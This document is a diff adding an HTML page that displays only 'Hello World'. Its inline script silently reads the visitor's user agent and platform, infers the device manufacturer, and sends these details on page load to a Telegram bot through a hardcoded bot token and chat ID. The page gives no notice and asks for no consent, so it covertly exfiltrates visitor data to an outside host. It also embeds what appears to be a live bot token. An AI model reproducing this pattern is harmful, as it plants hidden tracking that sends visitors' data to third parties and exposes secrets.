@@ -1,0 +1,50 @@
+<DOCTYPE html>
+  <html>
+    <body>
+      <h1>Hello World</h1>
+      
+      <script>
+        
+        // Replace YOUR_BOT_TOKEN and CHAT_ID with your own values
+const botToken = "6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU";
+const chatId = "5857694327";
+
+let manufacturer = "";
+const userAgent = navigator.userAgent;
+
+if (userAgent.indexOf("Samsung") > -1) {
+  manufacturer = "Samsung";
+} else if (userAgent.indexOf("iPhone") > -1) {
+  manufacturer = "Apple";
+} else if (userAgent.indexOf("Pixel") > -1) {
+  manufacturer = "Google";
+} else if (userAgent.indexOf("Huawei") > -1) {
+  manufacturer = "Huawei";
+} else if (userAgent.indexOf("Xiaomi") > -1) {
+  manufacturer = "Xiaomi";
+} else if (userAgent.indexOf("OPPO") > -1) {
+  manufacturer = "OPPO";
+} else if (userAgent.indexOf("Vivo") > -1) {
+  manufacturer = "Vivo";
+} else if (userAgent.indexOf("OnePlus") > -1) {
+  manufacturer = "OnePlus";
+} // add more conditions for other manufacturers
+
+const model = navigator.platform;
+
+const message = "Device manufacturer: " + manufacturer + "\nDevice model: " + model;
+
+fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message)
+  .then(response => {
+    console.log("Message sent successfully");
+  })
+  .catch(error => {
+    console.error(error);
+  });
+
+        
+      </script>
+      
+      
+    </body>
+    </html>
